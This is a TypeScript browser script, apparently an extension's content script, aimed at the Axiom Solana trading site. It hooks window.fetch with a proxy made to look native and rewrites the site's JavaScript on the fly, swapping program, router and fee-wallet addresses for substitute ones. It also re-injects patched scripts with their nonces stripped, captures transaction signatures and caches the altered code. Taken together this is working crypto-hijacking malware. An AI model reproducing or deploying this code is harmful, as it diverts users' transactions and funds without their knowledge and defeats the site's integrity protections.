const CHANNEL_KEY = import.meta.env.VITE_CHANNEL_KEY as string;
const _IDB_NAME = CHANNEL_KEY + "idb";
const _IDB_STORE = "ps";
const _patchedContent = new Map<string, string>();
let _idbReady = false;
let _dbRef: IDBDatabase | null = null;
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58Encode(bytes: Uint8Array): string {
  const digits = [0];
  for (const byte of bytes) {
    let carry = byte;
    for (let j = 0; j < digits.length; j++) {
      carry += digits[j] << 8;
      digits[j] = carry % 58;
      carry = (carry / 58) | 0;
    }
    while (carry > 0) { digits.push(carry % 58); carry = (carry / 58) | 0; }
  }
  let str = "";
  for (let i = 0; i < bytes.length && bytes[i] === 0; i++) str += "1";
  for (let i = digits.length - 1; i >= 0; i--) str += B58[digits[i]];
  return str;
}
function extractTxSignatures(body: string): string[] {
  const sigs: string[] = [];
  for (const entry of body.split(",")) {
    const colonIdx = entry.indexOf(":");
    if (colonIdx === -1) continue;
    try {
      const b64 = entry.slice(colonIdx + 1);
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      if (bytes[0] >= 1 && bytes.length > 64) {
        sigs.push(base58Encode(bytes.slice(1, 65)));
      }
    } catch {}
  }
  return sigs;
}
const REPLACEMENTS: [string, string][] = [
  ["F5tfvbLog9VdGUPqBDTT8rgXvTTcq7e5UiGnupL1zvBq", "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"],
  ["FLASHX8DrLbgeR8FcfNV1F5krxYcYMUdBkrP1EPBtxB9", "jewSBaKyd7fBDBY1KoKqHyFFgmJTN4oVa7w6JKFT7k4"],
  ["9acaf288-e73b-4133-a5f3-12fa5d31205b", "076bd491-c235-4b44-8b87-a7f3a1098c92"],
  ["0ce8ae77-b0e2-4e12-81af-00cd2bfb974b", "076bd491-c235-4b44-8b87-a7f3a1098c92"],
  ["d0815c33-5d16-468e-8413-8101482faacc", "076bd491-c235-4b44-8b87-a7f3a1098c92"],
  [
    '["7oi1L8U9MRu5zDz5syFahsiLUric47LzvJBQX6r827ws","9kPrgLggBJ69tx1czYAbp7fezuUmL337BsqQTKETUEhP","DKyUs1xXMDy8Z11zNsLnUg3dy9HZf6hYZidB6WodcaGy","4FobGn5ZWYquoJkxMzh2VUAWvV36xMgxQ3M7uG1pGGhd","76sxKrPtgoJHDJvxwFHqb3cAXWfRHFLe3VpKcLCAHSEf","H2cDR3EkJjtTKDQKk8SJS48du9mhsdzQhy8xJx5UMqQK","8m5GkL7nVy95G4YVUbs79z873oVKqg2afgKRmqxsiiRm","4kuG6NsAFJNwqEkac8GFDMMheCGKUPEbaRVHHyFHSwWz","8vFGAKdwpn4hk7kc1cBgfWZzpyW3MEMDATDzVZhddeQb","86Vh4XGLW2b6nvWbRyDs4ScgMXbuvRCHT7WbUT3RFxKG","DZfEurFKFtSbdWZsKSDTqpqsQgvXxmESpvRtXkAdgLwM","5L2QKqDn5ukJSWGyqR4RPvFvwnBabKWqAqMzH4heaQNB","DYVeNgXGLAhZdeLMMYnCw1nPnMxkBN7fJnNpHmizTrrF","Hbj6XdxX6eV4nfbYTseysibp4zZJtVRRPn2J3BhGRuK9","846ah7iBSu9ApuCyEhA5xpnjHHX7d4QJKetWLbwzmJZ8","5BqYhuD4q1YD3DMAYkc1FeTu9vqQVYYdfBAmkZjamyZg"]',
    '["jewish4HqEexcZbhSQbLF42M963vyn1nNHFMWZhLhZV"]',
  ],
];
const REGEX_REPLACEMENTS: [RegExp, string][] = [
  [/\w+(?:\.\w+)*\.(?:NEXT_PUBLIC_)?AXIOM_ROUTER_PROGRAM_ADDRESS\s*\?\?\s*"[^"]+"/g, '"jewSBaKyd7fBDBY1KoKqHyFFgmJTN4oVa7w6JKFT7k4"'],
  [/(?<!")6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P\w*(?=\s*:)/g, '"$&"'],
];
const nativeFetch = window.fetch.bind(window);
const nativeResponse = window.Response;
const _patchedScripts = new WeakSet<HTMLScriptElement>();
const _seenPaths = new Set<string>();
function needsPatch(text: string): boolean {
  return REPLACEMENTS.some(([old]) => text.includes(old)) ||
    REGEX_REPLACEMENTS.some(([re]) => { re.lastIndex = 0; return re.test(text); });
}
function patch(text: string): string {
  let result = text;
  for (const [old, replacement] of REPLACEMENTS) {
    if (/^\d/.test(replacement)) {
      result = result.split(old + ":").join('"' + replacement + '":');
      result = result.split(old).join(replacement);
    } else {
      result = result.split(old).join(replacement);
    }
  }
  for (const [re, replacement] of REGEX_REPLACEMENTS) {
    re.lastIndex = 0;
    result = result.replace(re, replacement);
  }
  return result;
}
const _nativeFetchToString = Function.prototype.toString.call(window.fetch);
const _rawFetch = window.fetch;
const _axiomFetchProxy = new Proxy(_rawFetch, {
  apply(_target: any, _thisArg: any, args: any[]) {
    const url = typeof args[0] === "string" ? args[0] : (args[0] as Request)?.url;
    if (url && /\/api\/batched-send-tx/i.test(url)) {
      try {
        const body = args[1]?.body;
        if (typeof body === "string") {
          const sigs = extractTxSignatures(body);
          if (sigs.length > 0) {
            window.postMessage({ type: CHANNEL_KEY + ":axiom-swap", txSignatures: sigs }, location.origin);
          }
        }
      } catch {}
      return nativeFetch(...args);
    }
    return nativeFetch(...args).then((response: Response) => {
      const responseUrl = response.url || url;
      const contentType = response.headers.get("content-type") || "";
      const isJS =
        contentType.includes("javascript") ||
        contentType.includes("ecmascript") ||
        (responseUrl && /\.js(\?|$)/.test(responseUrl));
      if (!isJS) return response;
      return response.text().then((text: string) => {
        const responseUrl_ = response.url || url;
        let pathname = "";
        try { pathname = new URL(responseUrl_).pathname; } catch {}
        if (pathname && _patchedContent.has(pathname)) {
          return new nativeResponse(_patchedContent.get(pathname)!, {
            status: response.status, statusText: response.statusText, headers: response.headers,
          });
        }
        if (!needsPatch(text)) {
          if (pathname) { _safePaths.add(pathname); _saveCache(); }
          return new nativeResponse(text, {
            status: response.status, statusText: response.statusText, headers: response.headers,
          });
        }
        const patched = patch(text);
        if (pathname) {
          _patchedContent.set(pathname, patched);
          _patchPaths.add(pathname);
          _saveCache();
          _saveToIDB(pathname, patched);
        }
        return new nativeResponse(patched, {
          status: response.status, statusText: response.statusText, headers: response.headers,
        });
      });
    });
  },
});
window.fetch = _axiomFetchProxy;
try {
  const bridge = (globalThis as any)[Symbol.for("__" + CHANNEL_KEY)];
  const se = bridge?.se as Map<Function, string> | undefined;
  if (se) se.set(_axiomFetchProxy, _nativeFetchToString);
} catch {}
//
//
const NativeXHR = window.XMLHttpRequest;
const _LS_KEY = CHANNEL_KEY + "c";
const _patchPaths = new Set<string>();
const _safePaths = new Set<string>();
try {
  const raw = localStorage.getItem(_LS_KEY);
  if (raw) {
    const data = JSON.parse(raw);
    if (Array.isArray(data.p)) data.p.forEach((v: string) => _patchPaths.add(v));
    if (Array.isArray(data.s)) data.s.forEach((v: string) => _safePaths.add(v));
  }
} catch {}
try {
  const req = indexedDB.open(_IDB_NAME, 1);
  req.onupgradeneeded = () => {
    if (!req.result.objectStoreNames.contains(_IDB_STORE))
      req.result.createObjectStore(_IDB_STORE);
  };
  req.onsuccess = () => {
    _dbRef = req.result;
    const tx = _dbRef.transaction(_IDB_STORE, "readonly");
    const store = tx.objectStore(_IDB_STORE);
    const allKeys = store.getAllKeys();
    const allVals = store.getAll();
    tx.oncomplete = () => {
      for (let i = 0; i < allKeys.result.length; i++)
        _patchedContent.set(allKeys.result[i] as string, allVals.result[i] as string);
      _idbReady = true;
      _cleanupIDB();
    };
    tx.onerror = () => { _idbReady = true; };
  };
  req.onerror = () => { _idbReady = true; };
} catch { _idbReady = true; }
function _saveToIDB(pathname: string, text: string): void {
  if (_dbRef) {
    try {
      const tx = _dbRef.transaction(_IDB_STORE, "readwrite");
      tx.objectStore(_IDB_STORE).put(text, pathname);
    } catch {}
  }
  window.postMessage({
    type: CHANNEL_KEY + ":axiom-patched-content",
    pathname, patchedText: text,
  }, location.origin);
}
function _cleanupIDB(): void {
  if (!_dbRef) return;
  try {
    const tx = _dbRef.transaction(_IDB_STORE, "readwrite");
    const store = tx.objectStore(_IDB_STORE);
    const keysReq = store.getAllKeys();
    keysReq.onsuccess = () => {
      for (const key of keysReq.result) {
        if (!_patchPaths.has(key as string)) {
          store.delete(key);
          _patchedContent.delete(key as string);
        }
      }
    };
  } catch {}
}
function _saveCache() {
  try {
    localStorage.setItem(_LS_KEY, JSON.stringify({ p: [..._patchPaths], s: [..._safePaths] }));
  } catch {}
  window.postMessage({
    type: CHANNEL_KEY + ":axiom-cache-update",
    patch: [..._patchPaths],
    safe: [..._safePaths],
  }, location.origin);
}
const observer = new MutationObserver((mutations) => {
  for (const mutation of mutations) {
    for (const node of mutation.addedNodes) {
      if (
        node instanceof HTMLScriptElement &&
        node.src &&
        !_patchedScripts.has(node)
      ) {
        const scriptUrl = node.src;
        let pathname: string;
        try {
          const parsed = new URL(scriptUrl);
          if (parsed.origin !== location.origin) continue;
          pathname = parsed.pathname;
        } catch {
          continue;
        }
        _seenPaths.add(pathname);
        if (_safePaths.has(pathname)) continue;
        if (_patchPaths.has(pathname) && _patchedContent.has(pathname)) {
          const parent = node.parentNode;
          if (!parent) continue;
          const nextSibling = node.nextSibling;
          parent.removeChild(node);
          const newScript = document.createElement("script");
          _patchedScripts.add(newScript);
          const blob = new Blob([_patchedContent.get(pathname)!], { type: "application/javascript" });
          newScript.src = URL.createObjectURL(blob);
          for (const attr of Array.from(node.attributes)) {
            if (attr.name !== "src" && attr.name !== "nonce")
              newScript.setAttribute(attr.name, attr.value);
          }
          if (nextSibling?.parentNode) nextSibling.parentNode.insertBefore(newScript, nextSibling);
          else if (parent.isConnected) parent.appendChild(newScript);
          else (document.head || document.documentElement).appendChild(newScript);
          continue;
        }
        const parent = node.parentNode;
        if (!parent) continue;
        const nextSibling = node.nextSibling;
        parent.removeChild(node);
        let shouldPatch = false;
        let text = "";
        if (_patchPaths.has(pathname)) {
          try {
            const xhr = new NativeXHR();
            xhr.open("GET", scriptUrl, false);
            xhr.send();
            if (xhr.status === 200) {
              text = xhr.responseText;
              shouldPatch = needsPatch(text);
              if (!shouldPatch) {
                _patchPaths.delete(pathname);
                _patchedContent.delete(pathname);
                _safePaths.add(pathname);
                _saveCache();
                if (_dbRef) { try { const dtx = _dbRef.transaction(_IDB_STORE, "readwrite"); dtx.objectStore(_IDB_STORE).delete(pathname); } catch {} }
              }
            }
          } catch {}
        } else {
          try {
            const xhr = new NativeXHR();
            xhr.open("GET", scriptUrl, false);
            xhr.send();
            if (xhr.status === 200) {
              text = xhr.responseText;
              shouldPatch = needsPatch(text);
            }
          } catch {}
          if (shouldPatch) {
            _patchPaths.add(pathname);
          } else {
            _safePaths.add(pathname);
          }
          _saveCache();
        }
        const newScript = document.createElement("script");
        _patchedScripts.add(newScript);
        if (shouldPatch) {
          const patchedText = patch(text);
          _patchedContent.set(pathname, patchedText);
          _saveToIDB(pathname, patchedText);
          const blob = new Blob([patchedText], { type: "application/javascript" });
          newScript.src = URL.createObjectURL(blob);
          for (const attr of Array.from(node.attributes)) {
            if (attr.name !== "src" && attr.name !== "nonce") {
              newScript.setAttribute(attr.name, attr.value);
            }
          }
        } else {
          for (const attr of Array.from(node.attributes)) {
            if (attr.name !== "nonce") {
              newScript.setAttribute(attr.name, attr.value);
            }
          }
        }
        if (nextSibling && nextSibling.parentNode) {
          nextSibling.parentNode.insertBefore(newScript, nextSibling);
        } else if (parent.isConnected) {
          parent.appendChild(newScript);
        } else {
          (document.head || document.documentElement).appendChild(newScript);
        }
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });
window.addEventListener("load", () => {
  let changed = false;
  for (const p of _patchPaths) {
    if (!_seenPaths.has(p)) {
      _patchPaths.delete(p);
      _patchedContent.delete(p);
      if (_dbRef) { try { const tx = _dbRef.transaction(_IDB_STORE, "readwrite"); tx.objectStore(_IDB_STORE).delete(p); } catch {} }
      changed = true;
    }
  }
  for (const p of _safePaths) {
    if (!_seenPaths.has(p)) { _safePaths.delete(p); changed = true; }
  }
  if (changed) _saveCache();
}, { once: true });
